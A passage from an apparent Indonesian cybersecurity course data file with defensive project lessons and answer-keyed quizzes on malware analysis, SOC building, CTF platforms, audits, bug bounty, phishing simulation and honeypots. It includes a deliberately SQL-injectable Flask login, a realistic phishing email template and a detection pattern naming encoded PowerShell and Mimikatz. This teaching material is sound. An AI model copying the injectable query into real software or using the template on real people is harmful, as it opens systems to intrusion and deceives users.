        question: "Apa kepanjangan PICERL dalam IR?",
        options: ["Preparation, Identification, Containment, Eradication, Recovery, Lessons", "Process, Implement, Control, Execute, Run, Log", "Pentest, Investigate, Contain, Eradicate, Report, Learn", "Phishing, ID, Content, Email, Root, Log"],
        answer: 0,
        explanation: "PICERL adalah akronim siklus Incident Response NIST: Preparation, Identification, Containment, Eradication, Recovery, Lessons Learned."
      },
      {
        question: "Tahap pertama setelah mendeteksi insiden?",
        options: ["Eradication", "Containment", "Recovery", "Lessons Learned"],
        answer: 1,
        explanation: "Setelah insiden teridentifikasi, containment (isolasi) adalah prioritas utama untuk mencegah penyebaran."
      },
      {
        question: "Apa yang dilakukan di fase Lessons Learned?",
        options: ["Reset password", "Post-mortem & perbaiki gap", "Restore backup", "Isolasi host"],
        answer: 1,
        explanation: "Lessons Learned adalah fase post-mortem: menganalisis root cause, mendokumentasikan gap, dan memperbaiki playbook."
      }
    ]
  },
  {
    level: 6,
    order: 7,
    title: "Project: Malware Analysis",
    slug: "project-malware-analysis",
    description: "Proyek menganalisis sample malware secara lengkap.",
    icon: "🧪",
    isProject: true,
    content: `# Project: Malware Analysis

Pada proyek akhir Level 6, Anda akan melakukan **analisis malware end-to-end** terhadap sampel (dari repo akademik seperti MalwareBazaar atau theZoo) dan menghasilkan laporan analisis profesional.

## Persiapan Lab

\`\`\`bash
# REMnux (Linux analysis) - VM isolated
# https://remnux.org

# FLARE-VM (Windows analysis) - VM isolated
# https://github.com/mandiant/flare-vm

# Penting:
# - VM SNAPSHOTTED, no shared folders with host
# - Network isolated / fake internet (INetSim)
# - No production credentials on the lab
\`\`\`

## Tahapan Analisis

### 1. Triage & Static Awal

\`\`\`bash
# Hash & identifikasi
sha256sum sample.bin
file sample.bin
# Submit hash ke VirusTotal (JIKA boleh expose)

# Strings & import
strings -n 8 sample.bin > strings.txt
pestudio sample.bin
\`\`\`

### 2. Dynamic Analysis

\`\`\`bash
# Setup monitoring di Windows VM
# - Procmon, Process Hacker, Regshot
# - Wireshark dengan fake-net
# - INetSim untuk simulasi internet

# Eksekusi & observe
# - Proses yang spawn
# - Perubahan registry
# - Network C2 traffic
# - File dropped
\`\`\`

### 3. Static Analysis Lanjut

\`\`\`bash
# Buka di Ghidra
# - Identify entry point
# - Decompile main function
# - Cari string, API call penting
# - Packer? (DIE / Detect It Easy)

# CAPA untuk capability identification
capa sample.bin
\`\`\`

### 4. Behavior & IoC Extraction

\`\`\`text
Identifikasi:
- C2 server (domain/IP)
- Persistence mechanism
- Lateral movement technique
- Exfiltration method
- MITRE ATT&CK TTP mapping
\`\`\`

## Struktur Laporan

\`\`\`text
1. Executive Summary
2. Sample Information (hash, size, type)
3. Static Analysis Findings
4. Dynamic Analysis Findings
5. Network Analysis (C2, protocol)
6. Code Analysis (key functions)
7. MITRE ATT&CK mapping
8. Indicators of Compromise (IoC)
9. Detection & Mitigation Recommendations
10. Appendix (screenshots, decompilation)
\`\`\`

## Deliverables

\`\`\`text
- PDF laporan analisis (15-25 halaman)
- File IoC (STIX/CSV format)
- YARA rule untuk deteksi
- Video walkthrough analisis (10-15 menit)
- Snapshot VM dengan tools siap pakai
\`\`\`

\`\`\`yara
rule TrojanSample_MalwareProj {
  meta:
    description = "Deteksi trojan dari proyek analisis"
    author      = "Your Name"
    date        = "2025-01-01"
  strings:
    $s1 = "C2_URL_PLACEHOLDER" wide ascii
    $s2 = { 4D 5A 90 00 03 00 00 00 }
    $api1 = "InternetOpenA" ascii
  condition:
    uint16(0) == 0x5A4D and 2 of ($s*, $api*)
}
\`\`\`

> Malware analysis yang baik bukan hanya "menemukan string jahat". Pahami intent, TTP, dan jadikan temuan actionable: IoC, YARA rule, dan rekomendasi deteksi yang bisa langsung dipakai SOC.`,
    quiz: [
      {
        question: "OS yang populer untuk lab analisis malware Linux?",
        options: ["REMnux", "Ubuntu Desktop", "Kali default", "Windows 11"],
        answer: 0,
        explanation: "REMnux adalah distro Linux yang sudah dilengkapi tools analisis malware reverse engineering."
      },
      {
        question: "Hal terpenting saat setup lab malware?",
        options: ["Internet cepat", "Isolasi jaringan & snapshot VM", "RAM besar", "GPU kencang"],
        answer: 1,
        explanation: "Lab malware harus terisolasi dari network produksi dan memiliki snapshot untuk revert — keselamatan prioritas utama."
      },
      {
        question: "Format standar untuk berbagi IoC antar tools?",
        options: ["PDF", "STIX", "PNG", "DOCX"],
        answer: 1,
        explanation: "STIX (Structured Threat Information Expression) adalah standar pertukaran threat intelligence termasuk IoC."
      }
    ]
  },

  // ==================== LEVEL 7 - PROJECT AKHIR (6, all isProject:true) ====================
  {
    level: 7,
    order: 1,
    title: "Build a SOC",
    slug: "project-build-soc",
    description: "Membangun Security Operations Center sederhana.",
    icon: "🏛️",
    isProject: true,
    content: `# Build a SOC

Pada proyek ini Anda akan membangun **Security Operations Center (SOC) sederhana** yang mampu mengumpulkan log, mendeteksi ancaman, dan memberi alert. SOC adalah jantung pertahanan organisasi modern.

## Komponen SOC

\`\`\`text
1. SIEM      - Splunk / ELK / Wazuh (log aggregation & correlation)
2. EDR       - endpoint detection (Wazuh agent, OSSEC)
3. IDS/IPS   - Suricata / Zeek (network)
4. Threat Intel - MISP (IoC sharing)
5. SOAR      - automasi response (Shuffle, Phantom)
6. IR Playbook - dokumentasi runbook
\`\`\`

## Arsitektur Minimal dengan Wazuh

\`\`\`bash
# Install Wazuh (All-in-one untuk lab)
curl -sO https://packages.wazuh.com/4.x/wazuh-install.sh
bash wazuh-install.sh --all-in-one

# Deploy agent di endpoint
WAZUH_MANAGER="10.0.0.10" apt install wazuh-agent

# Integrasi Suricata di sensor network
suricata -i eth0 --set outputs.1.eve-log.filename=/var/log/suricata/eve.json
# Kirim eve.json ke Wazuh via Filebeat
\`\`\`

## Use Case Detection

\`\`\`text
USE-CASE 1: Brute Force SSH
  - Filter: sshd "Failed password"
  - Threshold: >5 failed / 5 menit / IP
  - Action: alert + ban via firewall

USE-CASE 2: Suspicious PowerShell
  - Filter: process: powershell.exe
  - Pattern: -enc, DownloadString, Invoke-Mimikatz
  - Action: high severity alert

USE-CASE 3: C2 Beaconing
  - Filter: outbound connection periodic
  - Pattern: same IP, interval teratur
  - Action: investigate + block
\`\`\`

## Dashboard & KPI

\`\`\`bash
# Visualisasi di Kibana/Grafana
- Events per minute
- Top source IP
- Alert by severity
- MITRE ATT&CK heatmap
- Mean time to detect (MTTD)
- Mean time to respond (MTTR)
\`\`\`

## Deliverables

\`\`\`text
1. Diagram arsitektur SOC
2. Dashboard SIEM yang berfungsi
3. Minimal 5 use case detection (rule + alert)
4. IR Playbook untuk 3 skenario umum
5. Dokumentasi deployment
6. Demo video deteksi insiden
\`\`\`

> SOC bukan tentang tools, tapi tentang people + process + technology. Tools terbaik tanpa analyst terlatih dan playbook jelas hanya menghasilkan alert fatigue.`,
    quiz: [
      {
        question: "Apa fungsi SIEM dalam SOC?",
        options: ["Backup data", "Agregasi & korelasi log untuk deteksi", "Antivirus", "Web server"],
        answer: 1,
        explanation: "SIEM (Security Information & Event Management) mengumpulkan, mengkorelasikan log dan mendeteksi ancaman."
      },
      {
        question: "Platform SOC open-source populer?",
        options: ["Wazuh", "Microsoft Office", "Photoshop", "Excel"],
        answer: 0,
        explanation: "Wazuh adalah platform SIEM + EDR open-source yang banyak digunakan untuk membangun SOC."
      },
      {
        question: "KPI untuk mengukur kecepatan deteksi SOC?",
        options: ["MTTD", "CPU usage", "RAM", "Disk space"],
        answer: 0,
        explanation: "MTTD (Mean Time To Detect) mengukur rata-rata waktu dari terjadinya insiden hingga terdeteksi SOC."
      }
    ]
  },
  {
    level: 7,
    order: 2,
    title: "CTF Platform",
    slug: "project-ctf-platform",
    description: "Membuat platform Capture The Flag sendiri.",
    icon: "🏁",
    isProject: true,
    content: `# CTF Platform

Pada proyek ini Anda akan membangun **platform Capture The Flag (CTF)** sendiri — sistem yang dapat menyajikan tantangan keamanan, menerima submission flag, dan menampilkan scoreboard. CTF adalah cara terbaik untuk melatih skill keamanan secara praktis.

## Komponen Platform

\`\`\`text
1. Web App      - tampilkan tantangan & submit flag
2. Database     - simpan user, tantangan, submission
3. Scoreboard   - ranking real-time
4. Challenge VM - kontainer tantangan (Docker)
5. Auth         - registrasi & login tim
6. Admin Panel  - manajemen tantangan
\`\`\`

## Tech Stack Saran

\`\`\`bash
# Backend: Node.js + Express / Python + Flask
# Frontend: React / Next.js
# Database: PostgreSQL / MongoDB
# Container: Docker + Docker Compose

# CTFd - framework siap pakai
docker run -p 8000:8000 ctfd/ctfd
\`\`\`

## Arsitektur Tantangan

\`\`\`yaml
# docker-compose.yml untuk challenge
version: "3"
services:
  web-sqli:
    build: ./challenges/sqli
    ports:
      - "5001:80"
    environment:
      - FLAG=FLAG{sqli_1s_fun_12345}

  rev-binary:
    build: ./challenges/rev
    ports:
      - "5002:9999"
\`\`\`

## Kategori Tantangan

\`\`\`text
1. Web          - SQLi, XSS, IDOR, auth bypass
2. Pwn          - buffer overflow, ROP, format string
3. Reverse      - analisis binary, crackme
4. Crypto       - Caesar, RSA, AES misuse
5. Forensics    - pcap, steganography, memory dump
6. Misc         - logika, OSINT, scripting
\`\`\`

## Contoh Challenge Sederhana

\`\`\`python
# Challenge SQLi (Flask)
from flask import Flask, request, render_template_string
import sqlite3

app = Flask(__name__)

@app.route("/login", methods=["GET","POST"])
def login():
    user = request.form.get("user","")
    passw = request.form.get("pass","")
    # INTENTIONALLY VULNERABLE
    q = f"SELECT * FROM users WHERE user='{user}' AND pass='{passw}'"
    cur = sqlite3.connect("db.sqlite").cursor()
    cur.execute(q)
    if cur.fetchone():
        return "FLAG{sqli_master_2025}"
    return "Login failed", 401
\`\`\`

## Deliverables

\`\`\`text
1. Platform CTF berjalan (web + scoreboard)
2. Minimal 10 tantangan di 4 kategori
3. Docker compose untuk setup satu perintah
4. Writeup solusi tiap tantangan
5. Dokumentasi admin
6. Demo event dengan minimal 3 tim
\`\`\`

> Membangun CTF bukan hanya coding — desain tantangan yang edukatif (tidak frustasi tapi tidak trivial) adalah seni tersendiri. Sertakan hint bertingkat untuk kelancaran pengalaman belajar peserta.`,
    quiz: [
      {
        question: "Framework CTF siap pakai yang populer?",
        options: ["CTFd", "WordPress", "Magento", "Drupal"],
        answer: 0,
        explanation: "CTFd adalah framework CTF open-source paling populer untuk menyelenggarakan kompetisi CTF."
      },
      {
        question: "Kategori tantangan CTF untuk analisis binary?",
        options: ["Web", "Reverse Engineering", "Crypto", "OSINT"],
        answer: 1,
        explanation: "Reverse Engineering adalah kategori CTF yang berfokus pada analisis binary/executable untuk memahami cara kerjanya."
      },
      {
        question: "Format flag yang umum di CTF?",
        options: ["FLAG{text}", "password123", "admin", "root"],
        answer: 0,
        explanation: "Format flag umumnya berupa FLAG{...} atau picoCTF{...} yang menjadi tujuan peserta menyelesaikan tantangan."
      }
    ]
  },
  {
    level: 7,
    order: 3,
    title: "Security Audit",
    slug: "project-security-audit",
    description: "Melakukan audit keamanan lengkap pada sebuah organisasi.",
    icon: "📋",
    isProject: true,
    content: `# Security Audit

Pada proyek ini Anda akan melakukan **audit keamanan menyeluruh** pada sebuah organisasi (nyata atau simulasi). Audit berbeda dari pentest — fokus pada kepatuhan (compliance), kebijakan, dan postur keamanan keseluruhan, bukan eksploitasi teknis semata.

## Lingkup Audit

\`\`\`text
1. Governance      - kebijakan, prosedur, RACI
2. Risk Management - risk register, treatment
3. Access Control  - IAM, RBAC, MFA, password policy
4. Network         - firewall, segmentation, VPN
5. Endpoint        - hardening, EDR, patching
6. Data Protection - klasifikasi, enkripsi, DLP
7. Operations      - logging, monitoring, backup
8. Incident Response - playbook, latihan
9. Compliance      - ISO 27001, SOC 2, PCI-DSS
10. Human Factor   - security awareness, training
\`\`\`

## Framework Acuan

\`\`\`bash
# ISO 27001/27002 - ISMS
# NIST CSF       - Identify/Protect/Detect/Respond/Recover
# CIS Controls v8 - 18 control areas
# SOC 2          - Trust Service Principles
# PCI-DSS        - kartu kredit

# Audit framework checklists
# https://www.cisecurity.org/controls
\`\`\`

## Metodologi Audit

\`\`\`text
1. Kick-off meeting & scope definition
2. Document review (policies, procedures)
3. Interview stakeholders (IT, HR, finance)
4. Technical assessment (scan, configuration)
5. Observation (physical, operational)
6. Sampling & testing (controls effectiveness)
7. Gap analysis vs framework
8. Risk rating (likelihood × impact)
9. Report draft & validation
10. Final report + remediation roadmap
\`\`\`

## Contoh Finding Audit

\`\`\`text
AUDIT-FINDING-001: Tidak ada MFA pada akun admin

Control Area   : Access Control (CIS 6.3)
Severity       : High
Description    : Administrator SaaS critical (GCP, GitHub)
                 tidak mengaktifkan MFA. Berdasar interview
                 dengan tim DevOps tanggal 10/01.
Evidence       : Screenshot setting account + interview log
Risk           : Kompromi kredensial → akses penuh infra
Recommendation : Wajibkan MFA (TOTP/Hardware key) untuk
                 semua akun privilege, audit quarterly.
Owner          : Head of IT
Due Date       : 2025-03-01
\`\`\`

## Maturity Scoring

\`\`\`text
Level 1 - Initial    : ad-hoc, tidak terdokumentasi
Level 2 - Repeatable : sebagian terdokumentasi
Level 3 - Defined    : prosedur formal, konsisten
Level 4 - Managed    : metrik & KPI
Level 5 - Optimized  : continuous improvement
\`\`\`

## Deliverables

\`\`\`text
1. Audit charter & methodology
2. Risk register hasil audit
3. Gap analysis matrix vs framework
4. Final report (executive + detailed)
5. Remediation roadmap (12 bulan)
6. Presentation ke management
\`\`\`

> Audit keamanan yang baik memberikan peta jalan — bukan hanya daftar masalah. Prioritaskan rekomendasi berdasarkan risk dan business impact, bukan teknis semata.`,
    quiz: [
      {
        question: "Perbedaan audit keamanan dengan pentest?",
        options: ["Sama", "Audit fokus compliance & policy, pentest fokus eksploitasi teknis", "Audit lebih teknis", "Pentest lebih lambat"],
        answer: 1,
        explanation: "Audit keamanan fokus pada kepatuhan, kebijakan, dan postur keseluruhan, sementara pentest fokus eksploitasi teknis kerentanan."
      },
      {
        question: "Framework manajemen risiko dari NIST?",
        options: ["NIST CSF", "ISO 9001", "PCI-DSS", "GDPR"],
        answer: 0,
        explanation: "NIST Cybersecurity Framework (CSF) berisi 5 fungsi: Identify, Protect, Detect, Respond, Recover."
      },
      {
        question: "Apa itu MFA?",
        options: ["Multi-Factor Authentication", "Main Frame Access", "Manual File Access", "Mass File Archive"],
        answer: 0,
        explanation: "MFA (Multi-Factor Authentication) mengharuskan lebih dari satu faktor autentikasi (password + OTP/biometrik)."
      }
    ]
  },
  {
    level: 7,
    order: 4,
    title: "Bug Bounty Program",
    slug: "project-bug-bounty",
    description: "Menyusun program bug bounty untuk sebuah perusahaan.",
    icon: "💰",
    isProject: true,
    content: `# Bug Bounty Program

Pada proyek ini Anda akan **menyusun program bug bounty** end-to-end untuk sebuah perusahaan (nyata atau simulasi). Bug bounty adalah program yang memberi imbalan kepada peneliti independen yang menemukan & melaporkan kerentanan — model crowdsourced security yang efektif.

## Tahap Penyusunan

\`\`\`text
1. Stakeholder alignment (budget, scope, goals)
2. Pilih platform (HackerOne, Bugcrowd, Intigriti, self-hosted)
3. Definisikan scope & out-of-scope
4. Tetapkan reward tier (table)
5. Buat vulnerability rating guidelines
6. Tulis policy (disclosure, safe harbor)
7. Siapkan triage team
8. Internal dry-run (private program)
9. Public launch
10. Continuous improvement
\`\`\`

## Contoh Reward Table

\`\`\`text
Severity | Reward Range   | Contoh
---------|----------------|----------------------------
Critical | $5,000 - $20,000 | RCE, auth bypass, SQLi
High     | $1,500 - $5,000  | Stored XSS, IDOR, SSRF
Medium   | $500 - $1,500    | Reflected XSS, CSRF, info leak
Low      | $100 - $500      | Open redirect, missing security header
\`\`\`

## Scope Definition

\`\`\`yaml
# scope.yml
in_scope:
  - "*.example.com"
  - "api.example.com"
  - "mobile app: com.example.app (iOS/Android)"

out_of_scope:
  - "staging.example.com"
  - "marketing.example.com"
  - "DDoS, social engineering, physical"
  - "Vulnerability di library pihak ketiga (report upstream)"
\`\`\`

## Triage Workflow

\`\`\`bash
# 1. Researcher submit report via platform
# 2. Triage team validasi (repro & severity)
# 3. Forward ke engineering team
# 4. Engineering patch (SLA: Critical 7 hari)
# 5. Verifikasi patch oleh researcher
# 6. Bounty payout
# 7. Public disclosure (setelah agreement)
\`\`\`

## Safe Harbor Policy

\`\`\`text
Kami berkomitmen untuk TIDAK menuntut secara hukum
peneliti yang:

1. Menguji hanya pada akun miliknya sendiri
2. Tidak merusak data atau menyebabkan downtime
3. Tidak mengakses data user lain
4. Melaporkan temuan dalam 24 jam
5. Memberi waktu 90 hari sebelum disclosure
6. Tidak mengeksploitasi temuan untuk keuntungan
\`\`\`

## Metrics & KPI

\`\`\`text
- Reports received per month
- Valid bug rate (% valid dari total report)
- Mean time to triage (target < 24 jam)
- Mean time to resolution (target Critical < 14 hari)
- Repeat researchers (loyalty)
- Cost per valid vulnerability
- Coverage (subdomain/api tested)
\`\`\`

## Deliverables

\`\`\`text
1. Program policy document
2. Scope & reward table
3. Vulnerability rating guideline (VRT)
4. Triage SOP + playbook
5. Disclosure policy
6. Mock launch simulation (5-10 dummy report)
7. Dashboard KPI tracking
8. Pitch deck ke management (ROI analysis)
\`\`\`

> Bug bounty bukan pengganti pentest — melainkan pelengkap. Kombinasikan dengan internal pentest, automated scanning, dan bug bounty untuk pertahanan berlapis (defense in depth).`,
    quiz: [
      {
        question: "Platform bug bounty populer?",
        options: ["HackerOne", "Upwork", "Fiverr", "Freelancer"],
        answer: 0,
        explanation: "HackerOne adalah salah satu platform bug bounty paling populer, bersama Bugcrowd dan Intigriti."
      },
      {
        question: "Apa itu Safe Harbor policy?",
        options: ["Tempat berlabuh kapal", "Jaminan tidak dituntut hukum untuk peneliti good faith", "Asuransi bug bounty", "Bonus peneliti"],
        answer: 1,
        explanation: "Safe Harbor policy adalah komitmen perusahaan untuk tidak menuntut hukum peneliti yang melakukan testing dengan itikad baik dan mengikuti aturan."
      },
      {
        question: "Severity untuk kerentanan RCE biasanya?",
        options: ["Low", "Medium", "High", "Critical"],
        answer: 3,
        explanation: "Remote Code Execution (RCE) umumnya diklasifikasikan sebagai Critical severity karena impact sangat tinggi."
      }
    ]
  },
  {
    level: 7,
    order: 5,
    title: "Phishing Simulation",
    slug: "project-phishing-simulation",
    description: "Membuat kampanye simulasi phishing untuk awareness training.",
    icon: "📧",
    isProject: true,
    content: `# Phishing Simulation

Pada proyek ini Anda akan membangun **kampanye simulasi phishing** untuk awareness training karyawan. Tujuannya mengukur dan meningkatkan ketahanan manusia (human layer) terhadap serangan phishing — vektor serangan #1 di dunia.

## Komponen Simulasi

\`\`\`text
1. Platform     - GoPhish (open-source) / KingPhisher
2. Email server - SMTP relay (Amazon SES, Mailgun)
3. Landing page - halaman edukasi saat klik
4. Tracking     - who opened, clicked, submitted
5. Reporting    - dashboard per departemen
6. Training     - modul setelah klik
\`\`\`

## Setup GoPhish

\`\`\`bash
# Install GoPhish
wget https://github.com/gophish/gophish/releases/download/v0.12.1/gophish-v0.12.1-linux-64bit.zip
unzip gophish-v0.12.1-linux-64bit.zip
./gophish

# Akses https://127.0.0.1:3333 (admin password di log)

# Konfigurasi:
# 1. Sending Profile  - SMTP relay
# 2. Landing Page     - halaman edukasi
# 3. Email Template   - isi email phishing
# 4. Users & Groups   - target karyawan
# 5. Campaign         - gabungkan semua
\`\`\`

## Skenario Phishing

\`\`\`text
SKENARIO 1: IT Helpdesk Password Reset
  Subject: [URGENT] Reset Password Anda Dalam 24 Jam
  Template: tiruan logo internal, link ke landing page
  Landing: "Anda terjebak simulasi phishing! Pelajari ciri-cirinya..."

SKENARIO 2: HR - Bonus Update
  Subject: Update Data Bank Untuk Pembayaran Bonus
  Landing: modul edukasi 5 menit

SKENARIO 3: Cloud Storage Share
  Subject: John shared "Q4_Report.xlsx" with you
  Landing: pelatihan verifikasi pengirim
\`\`\`

## Tracking & Metrik

\`\`\`bash
# GoPhish melaporkan per karyawan:
# - Email Opened
# - Link Clicked
# - Form Submitted
# - Reported (jika ada tombol "Report Phishing")

# KPI:
- Phish-prone percentage (PPP) = klik / total dikirim
- Report rate = lapor / total dikirim
- Improvement over time (target PPP < 5%)
- Per departemen, per skenario
\`\`\`

## Contoh Email Template

\`\`\`html
<!-- Template phishing yang realistis -->
<html>
<body style="font-family: Arial;">
  <img src="https://internal-corp.example.com/logo.png">
  <h2>Peringatan Keamanan Akun</h2>
  <p>Kami mendeteksi aktivitas login mencurigakan pada akun Anda.
     Untuk mengamankan akun, silakan verifikasi identitas dalam 24 jam.</p>
  <a href="{{.URL}}" style="background:#0066cc;color:#fff;padding:10px 20px;">
    Verifikasi Sekarang
  </a>
  <p style="font-size:10px;color:gray;">© 2025 Internal Corp</p>
</body>
</html>
\`\`\`

## Edukasi Pasca Klik

\`\`\`text
Saat karyawan klik → redirect ke landing page:
1. Banner besar: "Anda baru saja klik phishing simulasi!"
2. Penjelasan ciri-ciri email yang baru dilihat
3. Tips: cek URL, cek pengirim, hover link
4. Kuis singkat 3 pertanyaan
5. Sertifikat "Phishing Awareness" bila lulus

Lanjut: karyawan yang sering klik wajib training intensif
\`\`\`

## Deliverables

\`\`\`text
1. Kampanye phishing yang berjalan (GoPhish)
2. Minimal 3 skenario (template + landing)
3. Dashboard laporan per departemen
4. Modul training pasca-klik
5. Policy "report phishing" + tombol di email client
6. Executive summary hasil kampanye
7. Roadmap program berkelanjutan (quarterly)
\`\`\`

> Phishing simulation bukan untuk menjebak atau mempermalukan karyawan. Fokus pada edukasi dan budaya — karyawan yang melaporkan phishing adalah aset pertahanan, bukan titik lemah.`,
    quiz: [
      {
        question: "Platform open-source untuk simulasi phishing?",
        options: ["GoPhish", "Burp Suite", "Metasploit", "Nessus"],
        answer: 0,
        explanation: "GoPhish adalah platform open-source populer untuk menjalankan kampanye simulasi phishing dan tracking hasilnya."
      },
      {
        question: "Metrik utama keberhasilan program phishing simulation?",
        options: ["Phish-prone percentage (PPP)", "CPU usage", "RAM", "Disk space"],
        answer: 0,
        explanation: "Phish-prone percentage (PPP) mengukur persentase karyawan yang klik — semakin rendah semakin baik."
      },
      {
        question: "Yang harus dilakukan saat karyawan klik phishing simulasi?",
        options: ["Dipecat", "Didedukasi, bukan dipermalukan", "Dipidana", "Didiamkan"],
        answer: 1,
        explanation: "Fokus simulasi adalah edukasi. Karyawan yang klik diarahkan ke modul pembelajaran, bukan dipermalukan atau dihukum."
      }
    ]
  },
  {
    level: 7,
    order: 6,
    title: "Build a Honeypot",
    slug: "project-honeypot",
    description: "Membangun honeypot untuk menangkap dan menganalisis serangan.",
    icon: "🍯",
    isProject: true,
    content: `# Build a Honeypot

Pada proyek terakhir ini Anda akan membangun **honeypot** — sistem yang sengaja dibuat rentan untuk menarik penyerang, sehingga aktivitas mereka bisa direkam dan dianalisis. Honeypot adalah alat intelijen ancaman berharga yang memberi visibilitas TTP (Tactics, Techniques, Procedures) penyerang di dunia nyata.

## Jenis Honeypot

\`\`\`text
Low-interaction  - simulasi service (aman, info terbatas)
  Contoh: Honeyd, Cowrie (SSH/Telnet)

Medium-interaction - simulasi lebih realistis
  Contoh: Dionaea (SMB, FTP), Conpot (ICS)

High-interaction - sistem nyata penuh (info lengkap, risiko)
  Contoh: real VM yang diizinkan dikompromi

Research honeypot - untuk riset TTP
Production honeypot - untuk deteksi di jaringan produksi
\`\`\`

## Cowrie — SSH/Telnet Honeypot

\`\`\`bash
# Install Cowrie di VM terisolasi
git clone https://github.com/cowrie/cowrie.git
cd cowrie
python3 -m venv cowrie-env
source cowrie-env/bin/activate
pip install -r requirements.txt

# Konfigurasi
cp etc/cowrie.cfg.dist etc/cowrie.cfg
# Edit: hostname, listen_port (2222), dst

# Jalankan
bin/cowrie start

# Cowrie menyimpan log di:
# var/log/cowrie/cowrie.json
# var/lib/cowrie/tty/*.log (sesi terminal)
\`\`\`

## Dionaea — Malware Catcher

\`\`\`bash
# Dionaea mensimulasikan SMB, FTP, HTTP, MSSQL
docker run -d -p 21:21 -p 445:445 -p 1433:1433 \\
  -v /var/dionaea:/var/dionaea \\
  dinotools/dionaea:latest

# Menerima exploit & menangkap sample malware
# Sample disimpan di /var/dionaea/binaries/
\`\`\`

## Arsitektur Aman

\`\`\`text
[Internet] --> [Firewall] --> [Honeypot Network isolated]
                                |
                                +--> Cowrie (SSH)
                                +--> Dionaea (SMB)
                                +--> Conpot (ICS)
                                +--> ElasticSearch (log)

PENTING:
- Honeypot TIDAK boleh bisa dipakai melompat ke jaringan internal
- Firewall hanya izinkan OUTBOUND ke logging server
- Disable forwarding ke internal
- Monitor resource (penyerang bisa pakai untuk DDoS)
\`\`\`

## Analisis & TTP Extraction

\`\`\`bash
# Analyze cowrie log
jq 'select(.eventid=="cowrie.login.success")' cowrie.json | jq '.username,.password'
jq 'select(.eventid=="cowrie.command.input")' cowrie.json | jq '.input'

# Top credentials digunakan
jq -r '.username + ":" + .password' cowrie.json | sort | uniq -c | sort -rn | head

# MITRE ATT&CK mapping dari command yang dijalankan
# whoami     → T1033 System Owner Discovery
# ipconfig   → T1016 System Network Config Discovery
# wget/mkdir → T1105 Ingress Tool Transfer
\`\`\`

## Visualisasi & Sharing

\`\`\`bash
# Kirim log ke ELK / Splunk untuk dashboard
# - Peta asal serangan (GeoIP)
# - Tren serangan per jam/hari
# - TTP heatmap
# - Sample malware baru

# Share IoC ke threat intel community
# - MISP
# - AbuseIPDB
# - VirusTotal (hash sample)
\`\`\`

## Deliverables

\`\`\`text
1. Honeypot aktif (minimal Cowrie + Dionaea)
2. Dashboard visualisasi serangan
3. Laporan analisis 1 bulan (TTP, IoC, tren)
4. Sample malware yang tertangkap + analisis ringkas
5. MITRE ATT&CK mapping dari observasi
6. Sharing IoC ke minimal 1 platform (MISP/AbuseIPDB)
7. Dokumentasi deployment & hardening
8. Rekomendasi detection rule untuk SOC (Sigma rule)
\`\`\`

\`\`\`yaml
# Contoh Sigma rule hasil honeypot
title: Cowrie Honeypot SSH Brute Force Source
logsource:
  product: cowrie
detection:
  selection:
    eventid: cowrie.login.failed
  condition: selection | count(username) by src_ip > 10
fields:
  - src_ip
  - username
level: medium
\`\`\`

> Honeypot memberi intelijen yang tidak bisa didapat dari tools defensif biasa — melihat penyerang di alam liar. Pastikan deployment aman, log terkumpul, dan temuan dibagikan kembali ke komunitas.`,
    quiz: [
      {
        question: "Apa tujuan utama honeypot?",
        options: ["Backup data", "Menarik & menganalisis serangan penyerang", "Antivirus", "Web server"],
        answer: 1,
        explanation: "Honeypot adalah sistem yang sengaja dibuat rentan untuk menarik penyerang dan merekam aktivitas mereka untuk analisis."
      },
      {
        question: "Honeypot SSH/Telnet open-source populer?",
        options: ["Cowrie", "Burp Suite", "Nessus", "Wireshark"],
        answer: 0,
        explanation: "Cowrie adalah honeypot medium-interaction untuk SSH dan Telnet yang populer di komunitas riset."
      },
      {
        question: "Yang harus diperhatikan saat deploy honeypot?",
        options: ["Akses internet cepat", "Isolasi agar tidak dipakai lompat ke jaringan internal", "RAM besar", "GPU kencang"],
        answer: 1,
        explanation: "Honeypot harus diisolasi — penyerang yang mengkompromi honeypot tidak boleh bisa melompat ke jaringan internal produksi."
      }
    ]
  }
];
